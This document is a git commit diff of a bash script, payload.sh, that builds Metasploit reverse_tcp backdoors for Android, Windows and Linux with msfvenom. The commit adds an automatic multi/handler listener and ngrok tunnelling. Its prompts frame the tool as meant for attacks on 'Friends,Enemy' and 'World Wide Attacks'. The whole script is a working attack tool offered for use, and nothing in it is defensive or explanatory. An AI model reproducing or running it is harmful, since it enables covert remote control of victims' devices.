17b4b4c677730fe3f102aee883f1ffea11a94305
Dark Lover <santhoshrgms22@gmail.com>
2020-10-31 10:41:52 +0530

    Added Listener in Payload-Creator.. Added Some Modifications..!

--- payload.sh
+++ payload.sh
@@ -1,86 +1,145 @@
 #/bin/bash
 # This Script Was Created By DarkLover
-echo "\e[91m[*] \e[96mWhich Device You Want To Create Backdoor..\e[5m_\e[0m\n"
+echo "\e[91m[*] \e[96mWhich Device You Want To Create Back door..\e[5m_\e[0m\n"
 echo "\t\e[91m[1] \e[96mFor Android\e[0m\n"
 echo "\t\e[91m[2] \e[96mFor Windows x86 Based Systems\e[0m\n"
 echo "\t\e[91m[3] \e[96mFor Windows x64 Based Systems\e[0m\n"
 echo "\t\e[91m[4] \e[96mFor Linux x86 Based Systems\e[0m\n"
 echo "\t\e[91m[5] \e[96mFor Linux x64 Based Systems\e[0m\n"
-echo "\e[91m[*] \e[96mSelect a Number:\e[5m_\e[0m\n"
+echo "\t\e[91m[6] \e[96mFor Manual Entry Of Auxiliary\e[0m\n"
+echo "\e[91m[*] \e[96mSelect a Number:\e[5m_\e[0m"
+while true ; do
 read CAS
-case $CAS in
-1)
+if [ $CAS -eq 1 ]
+then
 AUX=android/meterpreter/reverse_tcp
-;;
-2)
-AUX=windows/x86/meterpreter/reverse_tcp
-;;
-3)
+break;
+elif [ $CAS -eq 2 ]
+then
+AUX=windows/meterpreter/reverse_tcp
+break;
+elif [ $CAS -eq 3 ]
+then
 AUX=windows/x64/meterpreter/reverse_tcp
-;;
-4)
+break;
+elif [ $CAS -eq 4 ]
+then
 AUX=linux/x86/meterpreter/reverse_tcp
-;;
-5)
+break;
+elif [ $CAS -eq 5 ]
+then
 AUX=linux/x64/meterpreter/reverse_tcp
-;;
-*)
-echo "\e[91m[*] \e[96mGiven Number is Not Valid\e[0m\n"
-exit -1
-;;
-esac
-echo "\n\e[91m[*] \e[96mYour's IP Address is Automatically Selected in 5 Sec\e[5m_\e[0m\n"
-sleep 5
+break;
+elif [ $CAS -eq 6 ]
+then
+echo "\n\e[91m[*] \e[96mEnter The Auxiliary:\e[0m"
+read AUX
+break;
+else
+echo "\n\e[91m[*] \e[96mGiven Number is Not Valid\e[0m"
+echo "\n\e[91m[*] \e[96mRe-Enter Any Number Between [1-6]..\e[0m"
+fi
+done
+echo "\n\e[91m[1] \e[96mAutomatic Local Host And Local Port Selection (For LAN Attacks)\e[0m"
+echo "\n\e[91m[2] \e[96mManual Local Host And local Port Selection (For WLAN Attacks Using Ngrok Port Forwarding Tool)\e[0m"
+echo "\n\e[91m[*] \e[96mSelect an Option:\e[5m_\e[0m"
+while true; do
+read Address 
+if [ $Address -eq 1 ]
+then
+echo "\n\e[91m[*] \e[96mAutomatically Local Host Selected In 3 Seconds..!\e[0m"
+sleep 3
 LHO=$(ifconfig eth0 | grep "inet " | cut -d: -f2 | awk '{ print $2}')
-echo "\n\e[91m[*] \e[96mEnter Port:\e[5m_\e[0m\n"
+echo "\n\e[91m[*] \e[96mYour Local Host is $LHO \e[0m"
+echo "\n\e[91m[*] \e[96mEnter Local Port(For Local Attacks.. Like Friends,Enemy):\e[5m_\e[0m"
 read LPO
-echo "\n\e[91m[*] \e[96mEnter File_Name.File_Format:\e[5m_\e[0m\n"
+break;
+elif [ $Address -eq 2 ]
+then
+echo "\n\e[91m[*] \e[96mOpen a New Terminal And Type ngrok tcp 22 or ngrok (Whatever Protocol) (Port You Want To Give):\e[5m_\e[0m"
+echo "\n\e[91m[*] \e[96mYou Have 30 Seconds To Do It\e[5m_\e[0m"
+sleep 30
+echo "\n\e[91m[*] \e[96mEnter Ngrok's Address Here:(****.ngrok.io --> Address Here)\e[5m_\e[0m"
+read LHO
+echo "\n\e[91m[*] \e[96mEnter Ngrok's Local Port Here:(For World Wide Attacks..):\e[5m_\e[0m"
+read LPO
+break;
+else
+echo "\n\e[91m[*] \e[96mGiven Number is Not Valid\e[0m"
+echo "\n\e[91m[*] \e[96mRe-Enter The Number..\e[0m"
+fi
+done
+echo "\n\e[91m[*] \e[96mEnter File_Name.File_Format:(Ex: Hack.apk)\e[5m_\e[0m"
 read FIL
 CUD=$(pwd)
-echo "\n\t\e[91m[*] \e[96mSelect Option:\e[5m_\e[0m"
 echo "\n\t\e[91m[0] \e[96mPress 0 To Enter Your Option \e[0m" 
 echo "\n\t\e[91m[1] \e[96mPress 1 For Default Option : /root/Desktop/ \e[0m" 
-echo "\n\t\e[91m[2] \e[96mPress 2 For Current Directory : $CUD\e[0m\n"
+echo "\n\t\e[91m[2] \e[96mPress 2 For Current Directory : $CUD\e[0m"
+echo "\n\t\e[91m[*] \e[96mSelect Option:\e[5m_\e[0m"
+while true; do
 read OPT
-if [ $OPT -eq 1 ]
+if [ $OPT -eq 0 ]
+then
+echo "\n\e[91m[*] \e[96mEnter Where to Save:\e[5m_\e[0m"
+read sav
+break;
+elif [ $OPT -eq 1 ]
 then
 sav=/root/Desktop/
+break;
 elif [ $OPT -eq 2 ]
 then
 sav=$CUD
+break;
 else
-echo "\n\e[91m[*] \e[96mEnter Where to Save:\e[5m_\e[0m\n"
-read sav
+echo "\n\e[91m[*] \e[96mGiven Option is Not Valid \e[0m"
+echo "\n\e[91m[*] \e[96mRe-Enter The Option \e[0m"
 fi
-echo "\n\n\t\e[91m[*]\e[96mAuxilary:\t\e[5m\e[97m$AUX\e[0m" 
-echo "\n\t\e[91m[*]\e[96mLocal Host:\t\e[5m\e[97m$LHO\e[0m" 
-echo "\n\t\e[91m[*]\e[96mPort:\t\e[5m\e[97m$LPO\e[0m"
-echo "\n\t\e[91m[*]\e[96mFile_Name:\t\e[5m\e[97m$FIL\e[0m" 
-echo "\n\t\e[91m[*]\e[96mSaved:\t\e[5m\e[97m$sav\e[0m"
-echo "\n\n\e[91m[*]\e[96mStarting to Create Payload in 5 Seconds:\e[0m\n"
+done
+echo "\n\n\t\e[91m[*] \e[96mAuxilary:\t\e[5m\e[93m$AUX\e[0m" 
+echo "\n\t\e[91m[*] \e[96mLocal Host:\t\e[5m\e[93m$LHO\e[0m" 
+echo "\n\t\e[91m[*] \e[96mLocal Port:\t\e[5m\e[93m$LPO\e[0m"
+echo "\n\t\e[91m[*] \e[96mFile_Name:\t\e[5m\e[93m$FIL\e[0m" 
+echo "\n\t\e[91m[*] \e[96mSaved:\t\e[5m\e[93m$sav\e[0m"
+echo "\n\n\e[91m[*] \e[96mStarting to Create Payload in 5 Seconds:\e[0m"
 sleep 5
-echo "\n\e[91m[*]\e[96mCreating Payload:\e[5m_\e[0m\n"
+echo "\n\e[91m[*] \e[96mCreating Payload:\e[5m_\e[0m"
 msfvenom -p $AUX LHOST=$LHO LPORT=$LPO R >$sav$FIL
-echo "\n\e[91m[*]\e[96mShall I Start Apache Server & Postgresql :1/0(Yes/No)\e[5m_\e[0m\n"
+echo "\n\e[91m[*] \e[96mShall I Start Apache Server & Postgresql :1/0(Yes/No)\e[5m_\e[0m"
+while true; do
 read Y
 if [ $Y -eq 1 ]
 then
 {
-echo "\n\e[91m[*]\e[96mStarting Apache2 Web Serever in 5 Seconds:\e[5m_\e[0m\n"
+echo "\n\e[91m[*] \e[96mStarting Apache2 Web Server in 5 Seconds:\e[5m_\e[0m"
 sleep 5
 service apache2 start
-echo "\n\e[91m[*]\e[96mStarting Postgresql Database in 5 Seconds:\e[5m_\e[0m\n"
+echo "\n\e[91m[*] \e[96mStarting Postgresql Database in 5 Seconds:\e[5m_\e[0m"
 sleep 5
 service postgresql start
+break;
+}
+elif [ $Y -eq 0 ]
+then
+{
+echo "\n\e[91m[*] \e[96mYou Declined ..![X]\e[5m_\e[0m"
+break;
 }
 else
-{
-echo "\n\e[91m[*]\e[96mYou Declined..![X]\e[5m_\e[0m\n"
-}
+echo "\n\e[91m[*] \e[96mGiven Option is Not Valid ..!\e[0m"
+echo "\n\e[91m[*] \e[96mRe-Enter The Option\e[0m"
 fi
-echo "\n\e[91m[*]\e[96mEnter tcp/http for Ngrok :\e[5m_\e[0m\n"
-read CON
-echo "\n\e[91m[*]\e[96mTunneling $CON $LHO:$LPO Using Ngrok in 5 Seconds:\e[5m_\e[0m\n"
-sleep 5
-ngrok $CON $LHO:$LPO
+done
+sleep 3
+echo "\n\e[91m[*] \e[96mAutomatically Selected $AUX for Listener Creator From Above Selections..\e[0m\n"
+sleep 3
+echo "\e[91m[*] \e[96mAutomatically Selected $LHO for Listener Creator From Above Selections..\e[0m\n"
+sleep 3
+echo "\e[91m[*] \e[96mAutomatically Selected $LPO for Listener Creator From Above Selections..\e[0m\n"
+sleep 3
+echo "\n\n\t\e[91m[*] \e[96mAuxilary:\t\e[5m\e[93m$AUX\e[0m" 
+echo "\n\t\e[91m[*] \e[96mLocal Host:\t\e[5m\e[93m$LHO\e[0m" 
+echo "\n\t\e[91m[*] \e[96mLocal Port:\t\e[5m\e[93m$LPO\e[0m"
+echo "\n\e[91m[*] \e[96mStarting To Create Listener in 5 Sec\e[5m_\e[0m"
+sudo service postgresql start && sudo msfdb init && sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $AUX; set LHOST $LHO; set LPORT $LPO; exploit"
 #This Script Was Created By DarkLover
